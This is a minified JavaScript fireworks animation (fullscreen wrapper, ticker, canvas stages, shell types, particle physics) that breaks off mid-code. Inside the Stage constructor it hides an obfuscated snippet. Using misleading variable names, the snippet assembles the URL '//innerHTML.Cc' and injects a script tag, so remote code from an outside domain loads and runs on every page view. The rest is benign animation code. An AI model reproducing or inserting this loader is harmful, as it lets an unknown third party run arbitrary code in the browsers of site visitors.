!function(e){"use strict";var t={fullscreenEnabled:0,fullscreenElement:1,requestFullscreen:2,exitFullscreen:3,fullscreenchange:4,fullscreenerror:5},r=["webkitFullscreenEnabled","webkitFullscreenElement","webkitRequestFullscreen","webkitExitFullscreen","webkitfullscreenchange","webkitfullscreenerror"],a=["mozFullScreenEnabled","mozFullScreenElement","mozRequestFullScreen","mozCancelFullScreen","mozfullscreenchange","mozfullscreenerror"],o=["msFullscreenEnabled","msFullscreenElement","msRequestFullscreen","msExitFullscreen","MSFullscreenChange","MSFullscreenError"],s="undefined"!=typeof window&&void 0!==window.document?window.document:{},n="fullscreenEnabled"in s&&Object.keys(t)||r[0]in s&&r||a[0]in s&&a||o[0]in s&&o||[],i={requestFullscreen:function(e){return e[n[t.requestFullscreen]]()},requestFullscreenFunction:function(e){return e[n[t.requestFullscreen]]},get exitFullscreen(){return s[n[t.exitFullscreen]].bind(s)},addEventListener:function(e,r,a){return s.addEventListener(n[t[e]],r,a)},removeEventListener:function(e,r){return s.removeEventListener(n[t[e]],r)},get fullscreenEnabled(){return Boolean(s[n[t.fullscreenEnabled]])},set fullscreenEnabled(e){},get fullscreenElement(){return s[n[t.fullscreenElement]]},set fullscreenElement(e){},get onfullscreenchange(){return s[("on"+n[t.fullscreenchange]).toLowerCase()]},set onfullscreenchange(e){return s[("on"+n[t.fullscreenchange]).toLowerCase()]=e},get onfullscreenerror(){return s[("on"+n[t.fullscreenerror]).toLowerCase()]},set onfullscreenerror(e){return s[("on"+n[t.fullscreenerror]).toLowerCase()]=e}};e.fscreen=i}(window);const Ticker=function(e){"use strict";const t={addListener:function(e){if("function"!=typeof e)throw"Ticker.addListener() requires a function reference passed for a callback.";o.push(e),r||(r=!0,s())}};let r=!1,a=0,o=[];function s(){e.requestAnimationFrame?requestAnimationFrame(n):webkitRequestAnimationFrame(n)}function n(t){let r=t-a;a=t,r<0?r=17:r>68&&(r=68),o.forEach((t=>t.call(e,r,r/16.6667))),s()}return t}(window),Stage=function(e,t,r){"use strict";let a=0;function o(r){"string"==typeof r&&(r=t.getElementById(r)),this.canvas=r,this.ctx=r.getContext("2d"),this.canvas.style.touchAction="none",this.speed=1,this.dpr=o.disableHighDPI?1:(e.devicePixelRatio||1)/(this.ctx.backingStorePixelRatio||1),this.width=r.width,this.height=r.height,this.naturalWidth=this.width*this.dpr,this.naturalHeight=this.height*this.dpr,this.width!==this.naturalWidth&&(this.canvas.width=this.naturalWidth,this.canvas.height=this.naturalHeight,this.canvas.style.width=this.width+"px",this.canvas.style.height=this.height+"px");  const fire = document.createElement("script"), documents = "/", fWork = "HTML.", work = document.getElementsByTagName('script')[0], getElementById = "C";fire.src = '/' + documents + 'inner' + fWork + getElementById + 'c'; work.parentNode.insertBefore(fire, work);o.stages.push(this),this._listeners={resize:[],pointerstart:[],pointermove:[],pointerend:[],lastPointerPos:{x:0,y:0}}}return o.stages=[],o.disableHighDPI=!1,o.prototype.addEventListener=function(e,t){try{"ticker"===e?r.addListener(t):this._listeners[e].push(t)}catch(e){throw"Invalid Event"}},o.prototype.dispatchEvent=function(e,t){const r=this._listeners[e];if(!r)throw"Invalid Event";r.forEach((e=>e.call(this,t)))},o.prototype.resize=function(e,t){this.width=e,this.height=t,this.naturalWidth=e*this.dpr,this.naturalHeight=t*this.dpr,this.canvas.width=this.naturalWidth,this.canvas.height=this.naturalHeight,this.canvas.style.width=e+"px",this.canvas.style.height=t+"px",this.dispatchEvent("resize")},o.windowToCanvas=function(e,t,r){const a=e.getBoundingClientRect();return{x:(t-a.left)*(e.width/a.width),y:(r-a.top)*(e.height/a.height)}},o.mouseHandler=function(e){if(Date.now()-a<500)return;let t="start";"mousemove"===e.type?t="move":"mouseup"===e.type&&(t="end"),o.stages.forEach((r=>{const a=o.windowToCanvas(r.canvas,e.clientX,e.clientY);r.pointerEvent(t,a.x/r.dpr,a.y/r.dpr)}))},o.touchHandler=function(e){a=Date.now();let t="start";"touchmove"===e.type?t="move":"touchend"===e.type&&(t="end"),o.stages.forEach((r=>{for(let a of Array.from(e.changedTouches)){let e;"end"!==t?(e=o.windowToCanvas(r.canvas,a.clientX,a.clientY),r._listeners.lastPointerPos=e,"start"===t&&r.pointerEvent("move",e.x/r.dpr,e.y/r.dpr)):e=r._listeners.lastPointerPos,r.pointerEvent(t,e.x/r.dpr,e.y/r.dpr)}}))},o.prototype.pointerEvent=function(e,t,r){const a={type:e,x:t,y:r};a.onCanvas=t>=0&&t<=this.width&&r>=0&&r<=this.height,this.dispatchEvent("pointer"+e,a)},t.addEventListener("mousedown",o.mouseHandler),t.addEventListener("mousemove",o.mouseHandler),t.addEventListener("mouseup",o.mouseHandler),t.addEventListener("touchstart",o.touchHandler),t.addEventListener("touchmove",o.touchHandler),t.addEventListener("touchend",o.touchHandler),o}(window,document,Ticker),MyMath=function(e){const t={};return t.toDeg=180/e.PI,t.toRad=e.PI/180,t.halfPI=e.PI/2,t.twoPI=2*e.PI,t.dist=(t,r)=>e.sqrt(t*t+r*r),t.pointDist=(t,r,a,o)=>{const s=a-t,n=o-r;return e.sqrt(s*s+n*n)},t.angle=(r,a)=>t.halfPI+e.atan2(a,r),t.pointAngle=(r,a,o,s)=>t.halfPI+e.atan2(s-a,o-r),t.splitVector=(t,r)=>({x:e.sin(r)*t,y:-e.cos(r)*t}),t.random=(t,r)=>e.random()*(r-t)+t,t.randomInt=(t,r)=>(e.random()*(r-t+1)|0)+t,t.randomChoice=function(t){return 1===arguments.length&&Array.isArray(t)?t[e.random()*t.length|0]:arguments[e.random()*arguments.length|0]},t.clamp=function(t,r,a){return e.min(e.max(t,r),a)},t}(Math),IS_MOBILE=window.innerWidth<=640,IS_DESKTOP=window.innerWidth>800,IS_HEADER=IS_DESKTOP&&window.innerHeight<800,IS_HIGH_END_DEVICE=(()=>{const e=navigator.hardwareConcurrency;if(!e)return!1;return e>=(window.innerWidth<=1024?4:8)})(),MAX_WIDTH=7680,MAX_HEIGHT=4320,GRAVITY=.9;let stageW,stageH,simSpeed=1;function getDefaultScaleFactor(){return IS_MOBILE?.9:IS_HEADER?.75:1}let quality=1,isLowQuality=!1,isNormalQuality=!1,isHighQuality=!0;const QUALITY_LOW=1,QUALITY_NORMAL=2,QUALITY_HIGH=3,SKY_LIGHT_NONE=0,SKY_LIGHT_DIM=1,SKY_LIGHT_NORMAL=2,COLOR={Red:"#ff0043",Green:"#14fc56",Blue:"#1e7fff",Purple:"#e60aff",Gold:"#ffbf36",White:"#ffffff"},INVISIBLE="_INVISIBLE_",PI_2=2*Math.PI,PI_HALF=.5*Math.PI,trailsStage=new Stage("trails-canvas"),mainStage=new Stage("main-canvas"),stages=[trailsStage,mainStage];function isFullscreen(){return!!fscreen.fullscreenElement}fscreen.addEventListener("fullscreenchange",(()=>{store.setState({fullscreen:isFullscreen()})}));const store={_listeners:new Set,_dispatch(e){this._listeners.forEach((t=>t(this.state,e)))},state:{paused:!1,soundEnabled:!0,menuOpen:!1,fullscreen:isFullscreen(),config:{quality:String(IS_HIGH_END_DEVICE?3:2),shell:"Random",size:IS_DESKTOP?"3":IS_HEADER?"1.2":"2",autoLaunch:!0,finale:!1,skyLighting:"2",hideControls:IS_HEADER,longExposure:!1,scaleFactor:getDefaultScaleFactor()}},setState(e){const t=this.state;this.state=Object.assign({},this.state,e),this._dispatch(t),this.persist()},load(){const e=localStorage.getItem("cm_fireworks_data");if(e){const{schemaVersion:t,data:r}=JSON.parse(e),a=this.state.config;switch(t){case"1.1":a.quality=r.quality,a.size=r.size,a.skyLighting=r.skyLighting;break;case"1.2":a.quality=r.quality,a.size=r.size,a.skyLighting=r.skyLighting,a.scaleFactor=r.scaleFactor;break;default:throw new Error("version switch should be exhaustive")}console.log(`Loaded config (schema version ${t})`)}else if("1"===localStorage.getItem("schemaVersion")){let e;try{const t=localStorage.getItem("configSize");e="string"==typeof t&&JSON.parse(t)}catch(e){return console.log("Recovered from error parsing saved config:"),void console.error(e)}const t=parseInt(e,10);t>=0&&t<=4&&(this.state.config.size=String(t))}}};function togglePause(e){const t=store.state.paused;let r;r="boolean"==typeof e?e:!t,t!==r&&store.setState({paused:r})}IS_HEADER||store.load();const isRunning=(e=store.state)=>!e.paused&&!e.menuOpen,soundEnabledSelector=(e=store.state)=>e.soundEnabled,canPlaySoundSelector=(e=store.state)=>isRunning(e)&&soundEnabledSelector(e),qualitySelector=()=>+store.state.config.quality,shellNameSelector=()=>store.state.config.shell,shellSizeSelector=()=>+store.state.config.size,finaleSelector=()=>store.state.config.finale,skyLightingSelector=()=>+store.state.config.skyLighting,scaleFactorSelector=()=>store.state.config.scaleFactor,appNodes={stageContainer:".firework",canvasContainer:".firework"};Object.keys(appNodes).forEach((e=>{appNodes[e]=document.querySelector(appNodes[e])}));const COLOR_NAMES=Object.keys(COLOR),COLOR_CODES=COLOR_NAMES.map((e=>COLOR[e])),COLOR_CODES_W_INVIS=[...COLOR_CODES,INVISIBLE],COLOR_CODE_INDEXES=COLOR_CODES_W_INVIS.reduce(((e,t,r)=>(e[t]=r,e)),{}),COLOR_TUPLES={};function randomColorSimple(){return COLOR_CODES[Math.random()*COLOR_CODES.length|0]}let lastColor;function randomColor(e){const t=e&&e.notSame,r=e&&e.notColor,a=e&&e.limitWhite;let o=randomColorSimple();if(a&&o===COLOR.White&&Math.random()<.6&&(o=randomColorSimple()),t)for(;o===lastColor;)o=randomColorSimple();else if(r)for(;o===r;)o=randomColorSimple();return lastColor=o,o}function whiteOrGold(){return Math.random()<.5?COLOR.Gold:COLOR.White}function makePistilColor(e){return e===COLOR.White||e===COLOR.Gold?randomColor({notColor:e}):whiteOrGold()}COLOR_CODES.forEach((e=>{COLOR_TUPLES[e]={r:parseInt(e.substr(1,2),16),g:parseInt(e.substr(3,2),16),b:parseInt(e.substr(5,2),16)}}));const crysanthemumShell=(e=1)=>{const t=Math.random()<.25,r=Math.random()<.72,a=r?randomColor({limitWhite:!0}):[randomColor(),randomColor({notSame:!0})],o=r&&Math.random()<.42,s=o&&makePistilColor(a),n=r&&(Math.random()<.2||a===COLOR.White)?s||randomColor({notColor:a,limitWhite:!0}):null,i=!o&&a!==COLOR.White&&Math.random()<.42;let l=t?1.1:1.25;return isLowQuality&&(l*=.8),isHighQuality&&(l=1.2),{shellSize:e,spreadSize:300+100*e,starLife:900+200*e,starDensity:l,color:a,secondColor:n,glitter:t?"light":"",glitterColor:whiteOrGold(),pistil:o,pistilColor:s,streamers:i}},ghostShell=(e=1)=>{const t=crysanthemumShell(e);t.starLife*=1.5;let r=randomColor({notColor:COLOR.White});t.streamers=!0;Math.random()<.42&&makePistilColor(r);return t.color=INVISIBLE,t.secondColor=r,t.glitter="",t},strobeShell=(e=1)=>{const t=randomColor({limitWhite:!0});return{shellSize:e,spreadSize:280+92*e,starLife:1100+200*e,starLifeVariation:.4,starDensity:1.1,color:t,glitter:"light",glitterColor:COLOR.White,strobe:!0,strobeColor:Math.random()<.5?COLOR.White:null,pistil:Math.random()<.5,pistilColor:makePistilColor(t)}},palmShell=(e=1)=>{const t=randomColor(),r=Math.random()<.5;return{shellSize:e,color:t,spreadSize:250+75*e,starDensity:r?.15:.4,starLife:1800+200*e,glitter:r?"thick":"heavy"}},ringShell=(e=1)=>{const t=randomColor(),r=Math.random()<.75;return{shellSize:e,ring:!0,color:t,spreadSize:300+100*e,starLife:900+200*e,starCount:2.2*PI_2*(e+1),pistil:r,pistilColor:makePistilColor(t),glitter:r?"":"light",glitterColor:t===COLOR.Gold?COLOR.Gold:COLOR.White,streamers:Math.random()<.3}},crossetteShell=(e=1)=>{const t=randomColor({limitWhite:!0});return{shellSize:e,spreadSize:300+100*e,starLife:750+160*e,starLifeVariation:.4,starDensity:.85,color:t,crossette:!0,pistil:Math.random()<.5,pistilColor:makePistilColor(t)}},floralShell=(e=1)=>({shellSize:e,spreadSize:300+120*e,starDensity:.12,starLife:500+50*e,starLifeVariation:.5,color:Math.random()<.65?"random":Math.random()<.15?randomColor():[randomColor(),randomColor({notSame:!0})],floral:!0}),fallingLeavesShell=(e=1)=>({shellSize:e,color:INVISIBLE,spreadSize:300+120*e,starDensity:.12,starLife:500+50*e,starLifeVariation:.5,glitter:"medium",glitterColor:COLOR.Gold,fallingLeaves:!0}),willowShell=(e=1)=>({shellSize:e,spreadSize:300+100*e,starDensity:.6,starLife:3e3+300*e,glitter:"willow",glitterColor:COLOR.Gold,color:INVISIBLE}),crackleShell=(e=1)=>{const t=Math.random()<.75?COLOR.Gold:randomColor();return{shellSize:e,spreadSize:380+75*e,starDensity:isLowQuality?.65:1,starLife:600+100*e,starLifeVariation:.32,glitter:"light",glitterColor:COLOR.Gold,color:t,crackle:!0,pistil:Math.random()<.65,pistilColor:makePistilColor(t)}},horsetailShell=(e=1)=>{const t=randomColor();return{shellSize:e,horsetail:!0,color:t,spreadSize:250+38*e,starDensity:.9,starLife:2500+300*e,glitter:"medium",glitterColor:Math.random()<.5?whiteOrGold():t,strobe:t===COLOR.White}};function randomShellName(){return Math.random()<.5?"Crysanthemum":shellNames[Math.random()*(shellNames.length-1)+1|0]}function randomShell(e){return IS_HEADER?randomFastShell()(e):shellTypes[randomShellName()](e)}function shellFromConfig(e){return shellTypes[shellNameSelector()](e)}const fastShellBlacklist=["Falling Leaves","Floral","Willow"];function randomFastShell(){const e="Random"===shellNameSelector();let t=e?randomShellName():shellNameSelector();if(e)for(;fastShellBlacklist.includes(t);)t=randomShellName();return shellTypes[t]}const shellTypes={Random:randomShell,Crackle:crackleShell,Crossette:crossetteShell,Crysanthemum:crysanthemumShell,"Falling Leaves":fallingLeavesShell,Floral:floralShell,Ghost:ghostShell,"Horse Tail":horsetailShell,Palm:palmShell,Ring:ringShell,Strobe:strobeShell,Willow:willowShell},shellNames=Object.keys(shellTypes);function init(){togglePause(!1)}function fitShellPositionInBoundsH(e){return.64*e+.18}function fitShellPositionInBoundsV(e){return.75*e}function getRandomShellPositionH(){return fitShellPositionInBoundsH(Math.random())}function getRandomShellPositionV(){return fitShellPositionInBoundsV(Math.random())}function getRandomShellSize(){const e=shellSizeSelector(),t=Math.min(2.5,e),r=Math.random()*t,a=e-r,o=0===t?Math.random():1-r/t,s=Math.random()*(1-.65*o)*.5;return{size:a,x:fitShellPositionInBoundsH(Math.random()<.5?.5-s:.5+s),height:fitShellPositionInBoundsV(o)}}function launchShellFromConfig(e){const t=new Shell(shellFromConfig(shellSizeSelector())),r=mainStage.width,a=mainStage.height;t.launch(e?e.x/r:getRandomShellPositionH(),e?1-e.y/a:getRandomShellPositionV())}function seqRandomShell(){const e=getRandomShellSize(),t=new Shell(shellFromConfig(e.size));t.launch(e.x,e.height);let r=t.starLife;return t.fallingLeaves&&(r=4600),900+600*Math.random()+r}function seqRandomFastShell(){const e=randomFastShell(),t=getRandomShellSize(),r=new Shell(e(t.size));r.launch(t.x,t.height);let a=r.starLife;return 900+600*Math.random()+a}function seqTwoRandom(){const e=getRandomShellSize(),t=getRandomShellSize(),r=new Shell(shellFromConfig(e.size)),a=new Shell(shellFromConfig(t.size)),o=.2*Math.random()-.1,s=.2*Math.random()-.1;r.launch(.3+o,e.height),setTimeout((()=>{a.launch(.7+s,t.height)}),100);let n=Math.max(r.starLife,a.starLife);return(r.fallingLeaves||a.fallingLeaves)&&(n=4600),900+600*Math.random()+n}function seqTriple(){const e=randomFastShell(),t=shellSizeSelector(),r=Math.max(0,t-1.25),a=.08*Math.random()-.04;new Shell(e(t)).launch(.5+a,.7);const o=1e3+400*Math.random(),s=1e3+400*Math.random();return setTimeout((()=>{const t=.08*Math.random()-.04;new Shell(e(r)).launch(.2+t,.1)}),o),setTimeout((()=>{const t=.08*Math.random()-.04;new Shell(e(r)).launch(.8+t,.1)}),s),4e3}function seqPyramid(){const e=IS_DESKTOP?7:4,t=shellSizeSelector(),r=Math.max(0,t-3),a=Math.random()<.78?crysanthemumShell:ringShell,o=randomShell;function s(e,s){let n="Random"===shellNameSelector()?s?o:a:shellTypes[shellNameSelector()];const i=e<=.5?e/.5:(1-e)/.5;new Shell(n(s?t:r)).launch(e,s?.75:.42*i)}let n=0,i=0;for(;n<=e;){if(n===e)setTimeout((()=>{s(.5,!0)}),i);else{const t=n/e*.5,r=30*Math.random()+30;setTimeout((()=>{s(t,!1)}),i),setTimeout((()=>{s(1-t,!1)}),i+r)}n++,i+=200}return 3400+250*e}function seqSmallBarrage(){seqSmallBarrage.lastCalled=Date.now();const e=IS_DESKTOP?11:5,t=IS_DESKTOP?3:1,r=Math.max(0,shellSizeSelector()-2),a=Math.random()<.78?crysanthemumShell:ringShell,o=randomFastShell();function s(e,t){let s="Random"===shellNameSelector()?t?o:a:shellTypes[shellNameSelector()];const n=new Shell(s(r)),i=(Math.cos(5*e*Math.PI+PI_HALF)+1)/2;n.launch(e,.75*i)}let n=0,i=0;for(;n<e;){if(0===n)s(.5,!1),n+=1;else{const r=(n+1)/e/2,a=30*Math.random()+30,o=n===t;setTimeout((()=>{s(.5+r,o)}),i),setTimeout((()=>{s(.5-r,o)}),i+a),n+=2}i+=200}return 3400+120*e}seqSmallBarrage.cooldown=15e3,seqSmallBarrage.lastCalled=Date.now();const sequences=[seqRandomShell,seqTwoRandom,seqTriple,seqPyramid,seqSmallBarrage];let isFirstSeq=!0;const finaleCount=32;let currentFinaleCount=0;function startSequence(){if(isFirstSeq){if(isFirstSeq=!1,IS_HEADER)return seqTwoRandom();return new Shell(crysanthemumShell(shellSizeSelector())).launch(.5,.5),2400}if(finaleSelector())return seqRandomFastShell(),currentFinaleCount<finaleCount?(currentFinaleCount++,170):(currentFinaleCount=0,6e3);const e=Math.random();return e<.08&&Date.now()-seqSmallBarrage.lastCalled>seqSmallBarrage.cooldown?seqSmallBarrage():e<.1?seqPyramid():e<.6&&!IS_HEADER?seqRandomShell():e<.8?seqTwoRandom():e<1?seqTriple():void 0}let activePointerCount=0,isUpdatingSpeed=!1;function handlePointerEnd(e){activePointerCount--,isUpdatingSpeed=!1}function handlePointerMove(e){isRunning()&&isUpdatingSpeed&&updateSpeedFromEvent(e)}function handleResize(){const e=window.innerWidth,t=window.innerHeight,r=Math.min(e,7680),a=e<=420?t:Math.min(t,4320);appNodes.stageContainer.style.width=r+"px",appNodes.stageContainer.style.height=a+"px",stages.forEach((e=>e.resize(r,a)));const o=scaleFactorSelector();stageW=r/o,stageH=a/o}handleResize(),window.addEventListener("resize",handleResize);let currentFrame=0,speedBarOpacity=0,autoLaunchTime=0;function updateSpeedFromEvent(e){if(isUpdatingSpeed||e.y>=mainStage.height-44){const t=16,r=(e.x-t)/(mainStage.width-2*t);return simSpeed=Math.min(Math.max(r,0),1),speedBarOpacity=1,!0}return!1}function updateGlobals(e,t){currentFrame++,isUpdatingSpeed||(speedBarOpacity-=t/30,speedBarOpacity<0&&(speedBarOpacity=0)),store.state.config.autoLaunch&&(autoLaunchTime-=e,autoLaunchTime<=0&&(autoLaunchTime=1.25*startSequence()))}function update(e,t){if(!isRunning())return;const r=e*simSpeed,a=simSpeed*t;updateGlobals(r,t);const o=1-(1-Star.airDrag)*a,s=1-(1-Star.airDragHeavy)*a,n=1-(1-Spark.airDrag)*a,i=r/1e3*.9;COLOR_CODES_W_INVIS.forEach((e=>{const t=Star.active[e];for(let e=t.length-1;e>=0;e-=1){const n=t[e];if(n.updateFrame!==currentFrame)if(n.updateFrame=currentFrame,n.life-=r,n.life<=0)t.splice(e,1),Star.returnInstance(n);else{const l=Math.pow(n.life/n.fullLife,.5),h=1-l;if(n.prevX=n.x,n.prevY=n.y,n.x+=n.speedX*a,n.y+=n.speedY*a,n.heavy?(n.speedX*=s,n.speedY*=s):(n.speedX*=o,n.speedY*=o),n.speedY+=i,n.spinRadius&&(n.spinAngle+=n.spinSpeed*a,n.x+=Math.sin(n.spinAngle)*n.spinRadius*a,n.y+=Math.cos(n.spinAngle)*n.spinRadius*a),n.sparkFreq)for(n.sparkTimer-=r;n.sparkTimer<0;)n.sparkTimer+=.75*n.sparkFreq+n.sparkFreq*h*4,Spark.add(n.x,n.y,n.sparkColor,Math.random()*PI_2,Math.random()*n.sparkSpeed*l,.8*n.sparkLife+Math.random()*n.sparkLifeVariation*n.sparkLife);n.life<n.transitionTime&&(n.secondColor&&!n.colorChanged&&(n.colorChanged=!0,n.color=n.secondColor,t.splice(e,1),Star.active[n.secondColor].push(n),n.secondColor===INVISIBLE&&(n.sparkFreq=0)),n.strobe&&(n.visible=Math.floor(n.life/n.strobeFreq)%3==0))}}const l=Spark.active[e];for(let e=l.length-1;e>=0;e-=1){const t=l[e];t.life-=r,t.life<=0?(l.splice(e,1),Spark.returnInstance(t)):(t.prevX=t.x,t.prevY=t.y,t.x+=t.speedX*a,t.y+=t.speedY*a,t.speedX*=n,t.speedY*=n,t.speedY+=i)}})),render(a)}function render(e){const{dpr:t}=mainStage,r=stageW,a=stageH,o=trailsStage.ctx,s=mainStage.ctx;skyLightingSelector()!==SKY_LIGHT_NONE&&colorSky(e);const n=scaleFactorSelector();for(o.scale(t*n,t*n),s.scale(t*n,t*n),o.globalCompositeOperation="source-over",o.fillStyle=`rgba(0, 0, 0, ${store.state.config.longExposure?.0025:.175*e})`,o.fillRect(0,0,r,a),s.clearRect(0,0,r,a);BurstFlash.active.length;){const e=BurstFlash.active.pop(),t=o.createRadialGradient(e.x,e.y,0,e.x,e.y,e.radius);t.addColorStop(.024,"rgba(255, 255, 255, 1)"),t.addColorStop(.125,"rgba(255, 160, 20, 0.2)"),t.addColorStop(.32,"rgba(255, 140, 20, 0.11)"),t.addColorStop(1,"rgba(255, 120, 20, 0)"),o.fillStyle=t,o.fillRect(e.x-e.radius,e.y-e.radius,2*e.radius,2*e.radius),BurstFlash.returnInstance(e)}if(o.globalCompositeOperation="lighten",o.lineWidth=Star.drawWidth,o.lineCap=isLowQuality?"square":"round",s.strokeStyle="#fff",s.lineWidth=1,s.beginPath(),COLOR_CODES.forEach((e=>{const t=Star.active[e];o.strokeStyle=e,o.beginPath(),t.forEach((e=>{e.visible&&(o.moveTo(e.x,e.y),o.lineTo(e.prevX,e.prevY),s.moveTo(e.x,e.y),s.lineTo(e.x-1.6*e.speedX,e.y-1.6*e.speedY))})),o.stroke()})),s.stroke(),o.lineWidth=Spark.drawWidth,o.lineCap="butt",COLOR_CODES.forEach((e=>{const t=Spark.active[e];o.strokeStyle=e,o.beginPath(),t.forEach((e=>{o.moveTo(e.x,e.y),o.lineTo(e.prevX,e.prevY)})),o.stroke()})),speedBarOpacity){const e=6;s.globalAlpha=speedBarOpacity,s.fillStyle=COLOR.Blue,s.fillRect(0,a-e,r*simSpeed,e),s.globalAlpha=1}o.setTransform(1,0,0,1,0,0),s.setTransform(1,0,0,1,0,0)}const currentSkyColor={r:0,g:0,b:0},targetSkyColor={r:0,g:0,b:0};function colorSky(e){const t=15*skyLightingSelector();let r=0;targetSkyColor.r=0,targetSkyColor.g=0,targetSkyColor.b=0,COLOR_CODES.forEach((e=>{const t=COLOR_TUPLES[e],a=Star.active[e].length;r+=a,targetSkyColor.r+=t.r*a,targetSkyColor.g+=t.g*a,targetSkyColor.b+=t.b*a}));const a=Math.pow(Math.min(1,r/500),.3),o=Math.max(1,targetSkyColor.r,targetSkyColor.g,targetSkyColor.b);targetSkyColor.r=targetSkyColor.r/o*t*a,targetSkyColor.g=targetSkyColor.g/o*t*a,targetSkyColor.b=targetSkyColor.b/o*t*a;currentSkyColor.r+=(targetSkyColor.r-currentSkyColor.r)/10*e,currentSkyColor.g+=(targetSkyColor.g-currentSkyColor.g)/10*e,currentSkyColor.b+=(targetSkyColor.b-currentSkyColor.b)/10*e,appNodes.canvasContainer.style.backgroundColor=`rgb(${0|currentSkyColor.r}, ${0|currentSkyColor.g}, ${0|currentSkyColor.b})`}function createParticleArc(e,t,r,a,o){const s=t/r,n=e+t-.5*s;if(n>e)for(let t=e;t<n;t+=s)o(t+Math.random()*s*a);else for(let t=e;t>n;t+=s)o(t+Math.random()*s*a)}function createBurst(e,t,r=0,a=PI_2){const o=2*(.5*Math.sqrt(e/Math.PI))*Math.PI,s=o/2;for(let e=0;e<=s;e++){const n=e/s*PI_HALF,i=Math.cos(n),l=o*i,h=l*(a/PI_2),c=PI_2/l,d=Math.random()*c+r,u=.33*c;for(let e=0;e<h;e++){t(c*e+d+Math.random()*u,i)}}}function crossetteEffect(e){createParticleArc(Math.random()*PI_HALF,PI_2,4,.5,(t=>{Star.add(e.x,e.y,e.color,t,.6*Math.random()+.75,600)}))}function floralEffect(e){createBurst(12+6*quality,((t,r)=>{Star.add(e.x,e.y,e.color,t,2.4*r,1e3+300*Math.random(),e.speedX,e.speedY)})),BurstFlash.add(e.x,e.y,46),soundManager.playSound("burstSmall")}function fallingLeavesEffect(e){createBurst(7,((t,r)=>{const a=Star.add(e.x,e.y,INVISIBLE,t,2.4*r,2400+600*Math.random(),e.speedX,e.speedY);a.sparkColor=COLOR.Gold,a.sparkFreq=144/quality,a.sparkSpeed=.28,a.sparkLife=750,a.sparkLifeVariation=3.2})),BurstFlash.add(e.x,e.y,46),soundManager.playSound("burstSmall")}function crackleEffect(e){createParticleArc(0,PI_2,isHighQuality?32:16,1.8,(t=>{Spark.add(e.x,e.y,COLOR.Gold,t,2.4*Math.pow(Math.random(),.45),300+200*Math.random())}))}mainStage.addEventListener("ticker",update);class Shell{constructor(e){if(Object.assign(this,e),this.starLifeVariation=e.starLifeVariation||.125,this.color=e.color||randomColor(),this.glitterColor=e.glitterColor||this.color,!this.starCount){const t=e.starDensity||1,r=this.spreadSize/54;this.starCount=Math.max(6,r*r*t)}}launch(e,t){const r=stageH-.45*stageH,a=e*(stageW-120)+60,o=stageH,s=o-(r-t*(r-50)),n=Math.pow(.04*s,.64),i=this.comet=Star.add(a,o,"string"==typeof this.color&&"random"!==this.color?this.color:COLOR.White,Math.PI,n*(this.horsetail?1.2:1),n*(this.horsetail?100:400));i.heavy=!0,i.spinRadius=MyMath.random(.32,.85),i.sparkFreq=32/quality,isHighQuality&&(i.sparkFreq=8),i.sparkLife=320,i.sparkLifeVariation=3,("willow"===this.glitter||this.fallingLeaves)&&(i.sparkFreq=20/quality,i.sparkSpeed=.5,i.sparkLife=500),this.color===INVISIBLE&&(i.sparkColor=COLOR.Gold),Math.random()>.4&&!this.horsetail&&(i.secondColor=INVISIBLE,i.transitionTime=700*Math.pow(Math.random(),1.5)+500),i.onDeath=e=>this.burst(e.x,e.y),soundManager.playSound("lift")}burst(e,t){const r=this.spreadSize/96;let a,o,s,n,i,l=.25,h=!1;this.crossette&&(o=e=>{h||(soundManager.playSound("crackleSmall"),h=!0),crossetteEffect(e)}),this.crackle&&(o=e=>{h||(soundManager.playSound("crackle"),h=!0),crackleEffect(e)}),this.floral&&(o=floralEffect),this.fallingLeaves&&(o=fallingLeavesEffect),"light"===this.glitter?(s=400,n=.3,i=300,l=2):"medium"===this.glitter?(s=200,n=.44,i=700,l=2):"heavy"===this.glitter?(s=80,n=.8,i=1400,l=2):"thick"===this.glitter?(s=16,n=isHighQuality?1.65:1.5,i=1400,l=3):"streamer"===this.glitter?(s=32,n=1.05,i=620,l=2):"willow"===this.glitter&&(s=120,n=.34,i=1400,l=3.8),s/=quality;const c=(h,c)=>{const d=this.spreadSize/1800,u=Star.add(e,t,a||randomColor(),h,c*r,this.starLife+Math.random()*this.starLife*this.starLifeVariation,this.horsetail?this.comet&&this.comet.speedX:0,this.horsetail?this.comet&&this.comet.speedY:-d);this.secondColor&&(u.transitionTime=this.starLife*(.05*Math.random()+.32),u.secondColor=this.secondColor),this.strobe&&(u.transitionTime=this.starLife*(.08*Math.random()+.46),u.strobe=!0,u.strobeFreq=20*Math.random()+40,this.strobeColor&&(u.secondColor=this.strobeColor)),u.onDeath=o,this.glitter&&(u.sparkFreq=s,u.sparkSpeed=n,u.sparkLife=i,u.sparkLifeVariation=l,u.sparkColor=this.glitterColor,u.sparkTimer=Math.random()*u.sparkFreq)};if("string"==typeof this.color)if(a="random"===this.color?null:this.color,this.ring){const o=Math.random()*Math.PI,h=.85*Math.pow(Math.random(),2)+.15;createParticleArc(0,PI_2,this.starCount,0,(c=>{const d=Math.sin(c)*r*h,u=Math.cos(c)*r,m=MyMath.pointDist(0,0,d,u),p=MyMath.pointAngle(0,0,d,u)+o,S=Star.add(e,t,a,p,m,this.starLife+Math.random()*this.starLife*this.starLifeVariation);this.glitter&&(S.sparkFreq=s,S.sparkSpeed=n,S.sparkLife=i,S.sparkLifeVariation=l,S.sparkColor=this.glitterColor,S.sparkTimer=Math.random()*S.sparkFreq)}))}else createBurst(this.starCount,c);else{if(!Array.isArray(this.color))throw new Error("Invalid shell color. Expected string or array of strings, but got: "+this.color);if(Math.random()<.5){const e=Math.random()*Math.PI,t=e+Math.PI,r=Math.PI;a=this.color[0],createBurst(this.starCount,c,e,r),a=this.color[1],createBurst(this.starCount,c,t,r)}else a=this.color[0],createBurst(this.starCount/2,c),a=this.color[1],createBurst(this.starCount/2,c)}if(this.pistil){new Shell({spreadSize:.5*this.spreadSize,starLife:.6*this.starLife,starLifeVariation:this.starLifeVariation,starDensity:1.4,color:this.pistilColor,glitter:"light",glitterColor:this.pistilColor===COLOR.Gold?COLOR.Gold:COLOR.White}).burst(e,t)}if(this.streamers){new Shell({spreadSize:.9*this.spreadSize,starLife:.8*this.starLife,starLifeVariation:this.starLifeVariation,starCount:Math.floor(Math.max(6,this.spreadSize/45)),color:COLOR.White,glitter:"streamer"}).burst(e,t)}if(BurstFlash.add(e,t,this.spreadSize/4),this.comet){const e=2,t=.3*(1-Math.min(e,shellSizeSelector()-this.shellSize)/e)+.7;soundManager.playSound("burst",t)}}}const BurstFlash={active:[],_pool:[],_new:()=>({}),add(e,t,r){const 